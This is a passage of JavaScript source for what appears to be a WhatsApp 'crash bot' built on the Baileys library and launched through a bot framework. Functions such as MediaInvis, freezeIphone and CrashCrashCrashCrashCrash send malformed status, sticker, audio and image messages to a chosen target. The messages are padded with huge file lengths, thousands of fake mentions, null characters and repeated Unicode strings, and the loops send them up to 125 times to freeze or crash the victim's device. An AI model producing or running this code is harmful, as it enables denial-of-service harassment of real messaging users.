            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "maklu",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function MediaInvis(target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    };

    const imagePayload = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA?ccb=9-4&oh=01_Q5Aa2gHM2zIhFONYTX3yCXG60NdmPomfCGSUEk5W0ko5_kmgqQ&oe=68F85849&_nc_sid=e6ed6c&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "tEx11DW/xELbFSeYwVVtTuOW7+2smOcih5QUOM5Wu9c=",
        fileLength: 99999999999,
        height: 1280,
        width: 720,
        mediaKey: "+2NVZlEfWN35Be5t5AEqeQjQaa4yirKZhVzmwvmwTn4=",
        fileEncSha256: "O2XdlKNvN1lqENPsafZpJTJFh9dHrlbL7jhp/FBM/jc=",
        directPath: "/o1/v/t24/f2/m234/AQOHgC0-PvUO34criTh0aj7n2Ga5P_uy3J8astSgnOTAZ4W121C2oFkvE6-apwrLmhBiV8gopx4q0G7J0aqmxLrkOhw3j2Mf_1LMV1T5KA",
        mediaKeyTimestamp: 1758521043,
        isSampled: true,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 989,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399602691477@newsletter",
            newsletterName: "Awas Air Panas",
            contentType: "UPDATE_CARD",
            accessibilityText: "\u0000".repeat(10000),
            serverMessageId: 18888888
          },
          mentionedJid: Array.from({ length: 1900 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`)
        },
        scansSidecar: "/dx1y4mLCBeVr2284LzSPOKPNOnoMReHc4SLVgPvXXz9mJrlYRkOTQ==",
        scanLengths: [3599, 9271, 2026, 2778],
        midQualityFileSha256: "29eQjAGpMVSv6US+91GkxYIUUJYM2K1ZB8X7cCbNJCc=",
        annotations: [
          {
            polygonVertices: [
              { x: "0.05515563115477562", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.4132135510444641" },
              { x: "0.9448351263999939", y: "0.5867812633514404" },
              { x: "0.05515563115477562", y: "0.5867812633514404" }
            ],
            newsletter: {
              newsletterJid: "120363399602691477@newsletter",
              serverMessageId: 3868,
              newsletterName: "Awas Air Panas",
              contentType: "UPDATE_CARD",
              accessibilityText: "\u0000".repeat(5000)
            }
          }
        ]
      }
    };

    const msg1 = generateWAMessageFromContent(target, stickerPayload, {});
    const msg2 = generateWAMessageFromContent(target, audioPayload, {});
    const msg3 = generateWAMessageFromContent(target, imagePayload, {});

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target } }]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("❌ Error di:", err);
  }
}

async function freezeIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Mamakloe Jual Diri Buy IPhone" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function DelayMakerInviss(target) {
for (let i = 0; i < 125; i++) {
await PhenoxDrain(target);
await PhenoxDelay(target, mention)
await MediaInvis(target)
await sleep(2000);
await PhenoxDelay(target, mention)
await PhenoxDrain(target);
await MediaInvis(target)
await sleep(2000);
} 
}

async function DelayBeta(target) {
for (let i = 0; i < 125; i++) {
await VtxDelayBeta(target);
await VtxDelayBeta(target);
await sleep(1000);
}
}

async function CrashCrashCrashCrashCrash(target) {
   for (let i = 0; i < 100; i++) {
      await CInVisible(target, show = true) 
      await sleep(1000);
   }
}
//=================================================\\
bot.launch();
startSesi();
